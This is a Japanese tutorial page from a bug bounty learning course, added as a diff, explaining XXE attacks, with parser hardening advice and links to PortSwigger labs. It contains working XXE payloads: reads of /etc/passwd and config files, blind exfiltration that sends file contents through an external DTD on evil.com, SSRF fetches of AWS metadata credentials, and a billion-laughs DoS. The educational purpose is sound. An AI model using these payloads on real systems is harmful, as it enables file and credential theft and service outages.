@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XXE (XML External Entity) - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 1: Core Vulnerabilities &gt; XXE
+        </div>
+
+        <div class="page-header">
+            <h1>XXE (XML External Entity)</h1>
+            <p class="subtitle">
+                XML パーサーの外部エンティティ処理を悪用し、サーバー上のファイル読み取り、
+                SSRF、DoS、場合によっては RCE を実現する。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-wsa">WSA Lab</span>
+                <span class="tag tag-handson">Hands-on</span>
+            </div>
+        </div>
+
+        <!-- 原理 -->
+        <div class="section">
+            <h2>原理と仕組み</h2>
+            <p>
+                XML には DTD (Document Type Definition) で外部エンティティを定義する機能がある。
+                アプリケーションがユーザー提供の XML を解析する際に外部エンティティの解決を
+                無効化していないと、攻撃者はサーバーのファイルシステムやネットワークリソースに
+                アクセスできる。
+            </p>
+<pre><code>&lt;!-- XML 外部エンティティの基本構文 --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+
+&lt;!-- パーサーが &amp;xxe; を /etc/passwd の内容に展開する --&gt;</code></pre>
+
+            <div class="callout">
+                <div class="callout-title">XXE の Attack Surface</div>
+                <p>XML を受け付ける全てのエンドポイントが対象:</p>
+                <ul>
+                    <li>SOAP API (Content-Type: text/xml)</li>
+                    <li>REST API が XML も受け付ける場合</li>
+                    <li>ファイルアップロード (SVG, DOCX, XLSX, XML config)</li>
+                    <li>RSS/Atom フィードパーサー</li>
+                    <li>SAML 認証フロー</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- 種類 -->
+        <div class="section">
+            <h2>種類と分類</h2>
+
+            <h3>1. Classic XXE (In-band)</h3>
+            <p>
+                外部エンティティの内容がレスポンスに直接表示される場合。
+            </p>
+<pre><code>&lt;!-- ファイル読み取り --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+
+&lt;!-- Windows --&gt;
+&lt;!ENTITY xxe SYSTEM "file:///c:/windows/system.ini"&gt;
+
+&lt;!-- ソースコード読み取り (PHP filter) --&gt;
+&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php"&gt;</code></pre>
+
+            <h3>2. Blind XXE (Out-of-Band)</h3>
+            <p>
+                エンティティの内容がレスポンスに表示されない場合。
+                外部 DTD を利用してデータを攻撃者のサーバーに送信する。
+            </p>
+<pre><code>&lt;!-- 攻撃者のサーバーに外部DTDを配置 (https://evil.com/xxe.dtd) --&gt;
+&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'https://evil.com/?data=%file;'&gt;"&gt;
+%eval;
+%exfiltrate;
+
+&lt;!-- 送信する XML --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ENTITY % dtd SYSTEM "https://evil.com/xxe.dtd"&gt;
+    %dtd;
+]&gt;
+&lt;data&gt;test&lt;/data&gt;
+
+&lt;!-- 攻撃者のサーバーログに /etc/hostname の内容が記録される --&gt;</code></pre>
+
+            <h3>3. Error-based XXE</h3>
+            <p>
+                エラーメッセージにファイル内容を含ませる手法。Blind XXE の代替。
+            </p>
+<pre><code>&lt;!-- 外部 DTD (https://evil.com/error.dtd) --&gt;
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
+%eval;
+%error;
+
+&lt;!-- エラーメッセージ: "File not found: /nonexistent/root:x:0:0:..." --&gt;</code></pre>
+
+            <h3>4. SVG/DOCX/XLSX as XXE Vector</h3>
+            <p>
+                画像アップロード (SVG) やドキュメント (Office XML) を経由した XXE。
+                XML パーサーが使われていることに開発者が気づいていないケースが多い。
+            </p>
+<pre><code>&lt;!-- SVG XXE --&gt;
+&lt;?xml version="1.0" standalone="yes"?&gt;
+&lt;!DOCTYPE svg [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;
+]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"&gt;
+    &lt;text x="0" y="20"&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;
+
+&lt;!-- DOCX/XLSX (ZIP 内の XML ファイルを改ざん) --&gt;
+# 1. DOCX を展開
+unzip document.docx -d doc_extracted
+# 2. word/document.xml に XXE ペイロード注入
+# 3. 再圧縮
+cd doc_extracted && zip -r ../payload.docx .</code></pre>
+
+            <h3>5. XXE to SSRF</h3>
+<pre><code>&lt;!-- 内部ネットワークのスキャン --&gt;
+&lt;!ENTITY xxe SYSTEM "http://192.168.1.1/"&gt;
+&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+
+&lt;!-- AWS メタデータ取得 --&gt;
+&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;</code></pre>
+
+            <h3>6. Parameter Entity</h3>
+<pre><code>&lt;!-- 通常のエンティティが禁止されている場合 --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ENTITY % xxe SYSTEM "http://evil.com/collect"&gt;
+    %xxe;
+]&gt;
+
+&lt;!-- Parameter entity は DTD 内でのみ使用可能 (% prefix) --&gt;
+&lt;!-- 外部 DTD 内で通常エンティティを定義して使う --&gt;</code></pre>
+
+            <h3>7. Billion Laughs (DoS)</h3>
+<pre><code>&lt;!-- エンティティの再帰展開で指数関数的メモリ消費 --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE lolz [
+    &lt;!ENTITY lol "lol"&gt;
+    &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+    &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
+    &lt;!-- ... 9レベルまで → 10^9 個の "lol" 文字列 --&gt;
+]&gt;
+&lt;data&gt;&amp;lol9;&lt;/data&gt;</code></pre>
+        </div>
+
+        <!-- 検出方法 -->
+        <div class="section">
+            <h2>検出方法</h2>
+            <table>
+                <thead>
+                    <tr><th>手法</th><th>詳細</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Content-Type 変更</td><td>JSON → application/xml に変更してXMLを送信</td></tr>
+                    <tr><td>OOB 検出</td><td>外部DTDをコールバックサーバー(Burp Collaborator)に向ける</td></tr>
+                    <tr><td>ファイル読み取り</td><td>/etc/hostname 等の無害なファイルで確認</td></tr>
+                    <tr><td>エラー誘発</td><td>不正な DTD で XML パーサーのエラーメッセージ確認</td></tr>
+                    <tr><td>ファイル形式確認</td><td>SVG, DOCX, XLSX アップロード機能を探す</td></tr>
+                </tbody>
+            </table>
+
+            <div class="callout warning">
+                <div class="callout-title">JSON API での XXE テスト</div>
+<pre><code>// 元のリクエスト
+POST /api/data HTTP/1.1
+Content-Type: application/json
+{"name": "test"}
+
+// XXE テスト
+POST /api/data HTTP/1.1
+Content-Type: application/xml
+
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre>
+            </div>
+        </div>
+
+        <!-- 防御と Bypass -->
+        <div class="section">
+            <h2>防御と Bypass</h2>
+
+            <h3>防御策</h3>
+            <ul>
+                <li><strong>外部エンティティの無効化</strong> - パーサー設定で FEATURE_EXTERNAL_GENERAL_ENTITIES = false</li>
+                <li><strong>DTD の無効化</strong> - 完全に DTD 処理を無効化するのが最も安全</li>
+                <li><strong>JSON への移行</strong> - XML を使わない設計</li>
+                <li><strong>入力検証</strong> - DOCTYPE 宣言を含む XML を拒否</li>
+            </ul>
+
+<pre><code>// Java - 安全な設定
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+
+// Python - defusedxml
+from defusedxml import ElementTree
+tree = ElementTree.parse(xml_input)  // XXE 自動防御
+
+// PHP
+libxml_disable_entity_loader(true);  // PHP 8.0 以降は不要(デフォルト無効)</code></pre>
+        </div>
+
+        <!-- Practice -->
+        <div class="section">
+            <h2>Practice (WSA Labs)</h2>
+            <h3>PortSwigger Web Security Academy</h3>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files" target="_blank">Lab: Exploiting XXE to retrieve files</a></li>
+                <li><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf" target="_blank">Lab: Exploiting XXE to perform SSRF attacks</a></li>
+                <li><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction" target="_blank">Lab: Blind XXE with out-of-band interaction</a></li>
+                <li><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration" target="_blank">Lab: Blind XXE with out-of-band data exfiltration</a></li>
+                <li><a href="https://portswigger.net/web-security/xxe/lab-xinclude-attack" target="_blank">Lab: Exploiting XInclude to retrieve files</a></li>
+                <li><a href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload" target="_blank">Lab: Exploiting XXE via image file upload (SVG)</a></li>
+            </ul>
+        </div>
+
+        <!-- Key Takeaways -->
+        <div class="section">
+            <h2>Key Takeaways</h2>
+            <div class="card">
+                <ul>
+                    <li><strong>XML を受け付ける箇所は全て XXE の候補</strong>: SOAP, SVG upload, DOCX, SAML</li>
+                    <li><strong>Blind XXE は OOB で検出</strong>: Burp Collaborator / interactsh が必須ツール</li>
+                    <li><strong>Content-Type を変えてみる</strong>: JSON API でも XML を受け付けることがある</li>
+                    <li><strong>XXE → SSRF のチェーン</strong>: 内部ネットワークアクセスやクラウドメタデータ取得</li>
+                    <li><strong>ファイルアップロードを忘れない</strong>: SVG/DOCX が盲点になりやすい</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- References -->
+        <div class="section">
+            <h2>References</h2>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/xxe" target="_blank">PortSwigger - XXE</a></li>
+                <li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing" target="_blank">OWASP - XXE</a></li>
+                <li><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity" target="_blank">HackTricks - XXE</a></li>
+                <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" target="_blank">PayloadsAllTheThings - XXE</a></li>
+            </ul>
+        </div>
+
+        <!-- Complete Button -->
+        <div style="text-align:center; margin:2rem 0;">
+            <button class="complete-btn" data-module-id="17-xxe" onclick="toggleComplete('17-xxe')">Mark Complete</button>
+        </div>
+
+        <!-- Page Nav -->
+        <div class="page-nav">
+            <a href="16-file-upload.html">&larr; Prev: File Upload</a>
+            <a href="18-ssti.html">Next: SSTI &rarr;</a>
+        </div>
+    </div>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
